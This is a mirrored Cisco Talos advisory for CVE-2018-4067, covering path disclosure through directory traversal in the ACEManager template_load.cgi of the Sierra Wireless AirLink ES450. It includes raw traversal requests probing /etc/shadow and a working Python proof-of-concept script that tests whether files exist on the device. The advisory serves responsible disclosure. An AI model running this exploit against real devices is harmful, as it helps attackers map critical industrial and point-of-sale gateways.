@@ -1,0 +1,149 @@
+id: 32615
+date: 04/29/2019
+title: Sierra Wireless AirLink ES450 ACEManager template_load.cgi Information Disclosure Exploit
+author: Cisco Talos
+cves: CVE-2018-4067
+
+Sierra Wireless AirLink ES450 ACEManager template_load.cgi Information Disclosure Vulnerability
+
+CVE Number
+
+CVE-2018-4067
+
+Summary
+
+An exploitable information disclosure vulnerability exists in the ACEManager template_load.cgi functionality of Sierra Wireless AirLink ES450 FW 4.9.3. A specially crafted HTTP request can cause a information leak, resulting in the disclosure of internal paths and files. An attacker can make an authenticated HTTP request to trigger this vulnerability.
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+5.0 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
+CWE
+
+CWE-200: Information Exposure
+
+Details
+
+Sierra Wireless is a wireless communications equipement designer and manufacturer. They provide both embedded solutions as well as wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is a LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting Point-of-sale devices, remote SCADA equipment, or other business critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+ACEManager is the web server included with the AirLink ES450. This web server is responsible for the majority of interactions in the device. Some specific capabilities of the web server are routing, device reconfiguration, user authentication and certificate management. The vendor has stated that the ACEManager web application is not accessible by default from the Cellular WAN.
+
+The /cgi-bin/template_load.cgi binary is responsible for loading the previously uploaded template file to be used for configuration of the device. If we bypass the upload stage of the process and utilize template_load.cgi directly we can disclosure internal paths on the device with directory traversal within the path parameter. The requests below show a file that does not exist, as well as a file that does exist. The error messages disclose the information we need to determine if a file exists at the provided path or not.
+File does not exist
+
+ POST /cgi-bin/template_load.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+ Accept: text/plain, */*; q=0.01
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 40
+ Cookie: token=e9fa78d203adc768483d1409ac904133
+ Connection: close
+
+ path=/www/auth/user/../../../etc/shadows
+
+ ---------------------------------------------------------------
+ HTTP/1.1 200 OK
+ Status: 501 Internal Error
+
+ Cannot open /www/auth/user/../../../etc/shadows for reading
+
+File exists
+
+ POST /cgi-bin/template_load.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+ Accept: text/plain, */*; q=0.01
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 40
+ Cookie: token=e9fa78d203adc768483d1409ac904133
+ Connection: close
+
+ path=/www/auth/user/../../../etc/shadow
+
+ ---------------------------------------------------------------
+ HTTP/1.1 200 OK
+ Status: 400 Bad Request
+
+ Template document structure is incorrect or unrecognizable
+
+These vulnerabilities were discovered and tested using the AirLink ES450. Most likely this vulnerabilities also affects the AirLink GX450 product as well.
+
+Exploit Proof of Concept
+
+ #!/usr/bin/env python
+ #Author : Carl Hurd, Cisco Talos
+ import sys
+ import requests
+
+ def auth(ip, port, password):
+      data = """<request xmlns="urn:acemanager">
+      <connect>
+      <login>user</login>
+      <password><![CDATA[{}]]></password>
+      </connect>
+      </request>""".format(password)
+
+      response = requests.post("http://"+ip+":"+port+"/xml/Connect.xml", data=data)
+
+      try:
+           cookies = dict(token=response.headers["Set-Cookie"].split("; ")[0][len("token="):])
+           return cookies
+      except:
+           print("Error while authenticating")
+           sys.exit(0)
+
+ def main():
+      if len(sys.argv) < 5 or len(sys.argv) > 5:
+           print("Usage : {} [ip address] [port] [password of user] [absolute path of file to check]".format(sys.argv[0]))
+           sys.exit(0)
+
+      ip = sys.argv[1]
+      port = sys.argv[2]
+      password = sys.argv[3]
+      path = sys.argv[4]
+
+      print("Path : {}\n".format(path))
+
+      cookies = auth(ip, port, password)
+
+      data = "path=/www/auth/user/../../.." + path
+      response = requests.post("http://"+ip+":"+port+"/cgi-bin/template_load.cgi", cookies=cookies, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
+
+      if "501" in response.headers["Status"]:
+           print("{} : Does not exist".format(path))
+      elif "400" in response.headers["Status"]:
+           print("{} : Does exist".format(path))
+      else:
+           print("Unexpected status received!")
+
+ if __name__ == "__main__":
+      main()
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+Credit
+
+Discovered by Carl Hurd and Jared Rittle of Cisco Talos.
+
+#  0day.today [2023-03-26]  #
